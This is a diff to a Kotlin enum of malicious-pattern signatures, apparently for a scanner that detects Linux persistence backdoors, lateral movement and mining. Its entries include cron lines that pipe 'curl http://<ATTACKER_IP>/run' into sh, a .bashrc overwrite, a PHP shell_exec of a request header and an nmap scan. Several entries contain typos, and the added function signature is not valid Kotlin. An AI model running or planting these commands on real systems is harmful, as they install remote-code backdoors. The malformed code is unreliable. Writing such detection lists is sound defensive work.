@@ -24,32 +24,21 @@ enum class MaliciousPattern(
 
     // TODO Add lateralMove patter
     BackDoor1("/etc/crontab", "(crontab -l) \nn10 * * * * curl http://<ATTACKER_IP>/run | sh'"),
-    BackDoor2("crontab", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
-    BackDoor3("/etc/cron*", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
-    BackDoor4("/etc/at*", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
-    BackDoor5("/var/spool/cron/crontabs/roo", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
-    BackDoor6("/etc/anacrontab", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
+    BackDoor2("crontab", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
+    BackDoor3("/etc/cron*", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
+    BackDoor4("/etc/at*", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
+    BackDoor5("/var/spool/cron/crontabs/roo", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
+    BackDoor6("/etc/anacrontab", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
+    BackDoor7(".bashrc", "echo '{maliciou code}' > .bashrc"),
+    BackDoor8("shell_exec", "shell_exec(\$_SERVER['CMD'])"),
 
+    LateralMove1("nmap", "nmap -p 22 443"),
     // TODO add pattern
-    //   https://refabr1k.gitbook.io/oscp/
     //   https://0xsp.com/offensive/privilege-escalation-cheatsheet
     //   https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
-//    val privilegeEscalation = listOf(
-//        "import pty",
-//        "stty",
-//        "suid3num", // https://github.com/Anon-Exploiter/SUID3NUM
-//        "pspy", // https://github.com/DominicBreuker/pspy
-//        "TERM=xterm",
-//        "SHELL=bash",
-//        "TERM=xterm-256color",
-//    )
 
-//    val pentestToolNames = listOf<String>(
-//        "nmap",
-//        "masscan",
-//        "ssh",
-//        "dnsrecon",
-//        "gobuster",
 
     Mining1("CoinHive", "TODO")
+
+    fun search_malicious_pattern(val target: String): -> T{}
 }
